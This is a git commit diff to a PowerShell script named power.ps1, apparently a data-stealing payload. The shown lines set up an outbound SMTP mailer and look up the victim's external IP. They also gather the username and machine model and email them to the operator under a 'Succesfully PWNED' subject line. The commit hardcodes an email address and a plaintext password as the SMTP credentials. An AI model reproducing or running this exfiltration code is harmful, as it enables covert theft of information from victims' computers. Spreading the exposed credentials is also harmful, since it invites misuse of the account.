6ea3aebc8b477c15172b83202381c7003a7fd1fd
meruemmitnick-maker <meruemmitnick@gmail.com>
2025-09-21 11:51:44 +0800

    Update power.ps1

--- power.ps1
+++ power.ps1
@@ -13,10 +13,10 @@ $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
 $smtp = new-object Net.Mail.SmtpClient("smtp.outlook.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("email here @outlook.com", "email password");
+$smtp.Credentials = New-Object System.Net.NetworkCredential("meruemmitnick@gmail.com", "123Eagleeye456");
 $smtp.EnableSsl = $true
-$Message.From = "senders email address same as above"
-$Message.To.Add("receivers email address")
+$Message.From = "meruemmitnick@gmail.com"
+$Message.To.Add("meruemmitnick@gmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
